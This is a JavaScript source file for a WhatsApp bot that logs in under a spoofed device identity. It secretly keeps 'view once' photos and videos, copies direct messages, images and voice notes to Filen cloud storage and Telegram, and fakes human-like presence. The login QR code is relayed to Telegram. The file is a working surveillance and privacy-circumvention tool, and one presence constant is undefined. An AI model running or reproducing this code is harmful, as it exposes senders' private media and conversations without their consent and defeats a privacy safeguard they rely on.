import makeWASocket, { useMultiFileAuthState, DisconnectReason, downloadMediaMessage, jidNormalizedUser } from 'baileys'
import pino from 'pino'
import { writeFileSync, mkdirSync, readFileSync, readdirSync, existsSync } from 'fs'
import qrcode from 'qrcode-terminal'
import { senderDevice, senderMetadata, sendTelegramMedia, sendTelegramText, shouldSendRegularMedia, shouldSendTextMessages, startDownloadsCleanup, telegramRuntimeConfig } from './telegram.js'
import express from 'express'
import os from 'os'
import path from 'path'
import { FilenSDK } from '@filen/sdk'

const app = express()
const PORT = process.env.PORT || 8000

app.get('/', (req, res) => {
    res.send('Running the app!')
})

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`)
})

const filen = new FilenSDK({
    metadataCache: true,
    connectToSocket: true,
    tmpPath: path.join(os.tmpdir(), "filen-sdk")
})

await filen.login({
    email: process.env.FILEN_MAIL || "",
    password: process.env.FILEN_PASSWORD || "",
})

const LOCAL_TMP_DIR = path.join(os.tmpdir(), 'wa_tmp')
const LOCAL_AUTH_DIR = path.join(LOCAL_TMP_DIR, 'auth')
mkdirSync(LOCAL_AUTH_DIR, { recursive: true })

try {
    await filen.fs().mkdir({ path: "/downloads" })
    await filen.fs().mkdir({ path: "/auth" })
} catch (e) {
}

async function downloadAuthFromFilen() {
    try {
        console.log('[Filen] Synchronizing session from the cloud...')
        const files = await filen.fs().readdir({ path: "/auth" })

        for (const file of files) {
            const buffer = await filen.fs().readFile({
                path: `/auth/${file}`
            })
            writeFileSync(path.join(LOCAL_AUTH_DIR, file), buffer)
        }
        console.log('[Filen] Session synchronized successfully!');
    } catch (err) {
        console.log(`[Filen] No previous session found or error occurred while downloading: ${err.message}`)
    }
}

async function uploadAuthToFilen() {
    try {
        const files = readdirSync(LOCAL_AUTH_DIR)
        for (const file of files) {
            const localPath = path.join(LOCAL_AUTH_DIR, file)
            const buffer = readFileSync(localPath)

            await filen.fs().writeFile({
                path: `/auth/${file}`,
                content: buffer
            })
            console.log(`[Filen] Saved on: /auth/${file}`)
        }
        console.log('[Filen] Session update completed.')
    } catch (err) {
        console.log(`[Filen] Error occurred while backing up the session: ${err.message}`)
    }
}

const PERSONAL_SUFFIXES = ['@s.whatsapp.net', '@lid', '@c.us']
const FILE_SIZE = Number(process.env.DOWNLOADS_FILE_SIZE) || 20
const MAX_MEDIA_BYTES = FILE_SIZE * 1024 * 1024
const isPersonal = (jid) => PERSONAL_SUFFIXES.some(s => jid?.endsWith(s))
const PRESENCE_INTERVAL_MIN_MS = 4 * 60_000
const PRESENCE_INTERVAL_MAX_MS = 80 * 60_000
const randomBetween = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min
let activeWhatsAppSocket = null

const formatError = (err) => err?.stack || err?.message || String(err)
const formatMediaCaption = (title, metadata, caption) => {
    const hasCaption = typeof caption === 'string' && caption.trim().length > 0
    const parts = [title]
    if (hasCaption) parts.push(caption)
    parts.push(metadata)
    return parts.join('\n\n')
}

async function notifyTelegramEvent(title, details) {
    try {
        await sendTelegramText(`[${title}]\nTime: ${new Date().toISOString()}\n${details}`)
    } catch (err) {
        console.log(`[Telegram] Failed to send ${title}: ${err.message}`)
    }
}

async function startSpoofedSession() {
    await downloadAuthFromFilen()

    const { state, saveCreds } = await useMultiFileAuthState(LOCAL_AUTH_DIR)
    let presenceTimer = null

    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ['Pixel 10', 'WhatsApp', '2.26.16.73'],
        syncFullHistory: false
    })

    sock.ev.on('creds.update', async () => {
        await saveCreds()
        await uploadAuthToFilen()
    })

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update

        if (qr) {
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`
            console.log('--- New QR CODE ---')
            console.log(qrUrl)
            qrcode.generate(qr, { small: true })
            void notifyTelegramEvent('QR CODE', qrUrl)
        }

        if (connection === 'close') {
            if (activeWhatsAppSocket === sock) activeWhatsAppSocket = null
            if (presenceTimer) { clearTimeout(presenceTimer); presenceTimer = null }
            const statusCode = lastDisconnect?.error?.output?.statusCode
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut
            console.log(`Connection closed. Reconnecting: ${shouldReconnect}`)
            void notifyTelegramEvent('DISCONNECTED', [
                `Status code: ${statusCode || 'unknown'}`,
                `Reconnect: ${shouldReconnect}`,
            ].join('\n'))
            if (shouldReconnect) startSpoofedSession()
        } else if (connection === 'open') {
            activeWhatsAppSocket = sock
            const ownJid = jidNormalizedUser(sock.user?.id)
            console.log(`Connected as ${ownJid}. Waiting for messages...`)

            const schedulePresence = () => {
                const delay = randomBetween(PRESENCE_INTERVAL_MIN_MS, PRESENCE_INTERVAL_MAX_MS)
                presenceTimer = setTimeout(async () => {
                    try {
                        await sock.sendPresenceUpdate('available')
                        await new Promise(r => setTimeout(r, randomBetween(PRESENCE_BLIP_MIN_MS, PRESENCE_BLIP_MAX_MS)))
                        await sock.sendPresenceUpdate('unavailable')
                    } catch (err) {
                        console.log(`[Presence] Failed: ${err.message}`)
                        void notifyTelegramEvent('PRESENCE ERROR', formatError(err))
                    }
                    schedulePresence()
                }, delay)
            }
            schedulePresence()
        }
    })

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return

        for (const msg of messages) {
            if (!msg.message) continue

            const sender = msg.key.remoteJid
            const metadata = senderMetadata(msg)

            const media = msg.message.imageMessage || msg.message.videoMessage
            const viewOnceWrapper = msg.message.viewOnceMessageV2
                || msg.message.viewOnceMessage
                || msg.message.viewOnceMessageV2Extension
            const isViewOnce = media?.viewOnce === true || !!viewOnceWrapper

            if (isViewOnce) {
                const inner = viewOnceWrapper?.message || msg.message
                const mediaType = inner?.imageMessage ? 'image' : inner?.videoMessage ? 'video' : 'unknown'
                const ext = mediaType === 'image' ? 'jpg' : mediaType === 'video' ? 'mp4' : 'bin'
                const caption = inner?.imageMessage?.caption ?? inner?.videoMessage?.caption

                console.log(`\n[VIEW ONCE] from ${sender} (${mediaType})`)

                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {})
                    const filename = `viewonce_${Date.now()}.${ext}`

                    await filen.fs().writeFile({
                        path: `/downloads/${filename}`,
                        content: buffer
                    })
                    console.log(`[Filen] Saved on: /downloads/${filename}`)

                    try {
                        const telegramCaption = formatMediaCaption(`[VIEW ONCE] ${mediaType}`, metadata, caption)
                        await sendTelegramMedia(buffer, filename, mediaType, telegramCaption)
                    } catch (err) {
                        console.log(`[VIEW ONCE] Telegram send failed: ${err.message}`)
                    }
                } catch (err) {
                    console.log(`Download/Upload failed: ${err.message}`)
                    void notifyTelegramEvent('VIEW ONCE ERROR', `${metadata}\n\n${formatError(err)}`)
                }
                console.log('--------------------------------------------------\n')

            } else if (isPersonal(sender)) {
                const shortSender = sender.split('@')[0]
                const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text

                const mediaMap = {
                    image: { msg: msg.message.imageMessage, ext: 'jpg' },
                    video: { msg: msg.message.videoMessage, ext: 'mp4' },
                    voice: { msg: msg.message.audioMessage, ext: 'ogg' },
                }
                const mediaType = Object.keys(mediaMap).find(k => mediaMap[k].msg)

                if (mediaType) {
                    const { msg: mediaMsg, ext } = mediaMap[mediaType]
                    const size = Number(mediaMsg.fileLength) || 0
                    const caption = mediaMsg.caption

                    if (size && size > MAX_MEDIA_BYTES) {
                        console.log(`[DM Media] ${shortSender} → ${mediaType} skipped (${size} bytes > 20MB)`)
                    } else {
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer', {})
                            const filename = `${mediaType}_${Date.now()}.${ext}`

                            await filen.fs().writeFile({
                                path: `/downloads/${filename}`,
                                content: buffer
                            })
                            console.log(`[Filen] Saved on: /downloads/${filename}`)

                            if (shouldSendRegularMedia()) {
                                try {
                                    const telegramCaption = formatMediaCaption(`[DM MEDIA] ${mediaType}`, metadata, caption)
                                    await sendTelegramMedia(buffer, filename, mediaType, telegramCaption)
                                } catch (err) {
                                    console.log(`[DM Media] Telegram send failed: ${err.message}`)
                                }
                            }
                        } catch (err) {
                            console.log(`[DM Media] Download/Upload failed: ${err.message}`)
                            void notifyTelegramEvent('DM MEDIA ERROR', `${metadata}\n\n${formatError(err)}`)
                        }
                    }
                } else {
                    console.log(`[Normal] ${shortSender}: ${text || '[Non-text]'}`)
                    if (text && shouldSendTextMessages()) {
                        try {
                            await sendTelegramText(`[DM TEXT]\n${metadata}\n\n${text}`)
                        } catch (err) {
                            console.log(`[Normal] ${shortSender} → Telegram send failed: ${err.message}`)
                        }
                    }
                }
            }
        }
    })
}

startSpoofedSession()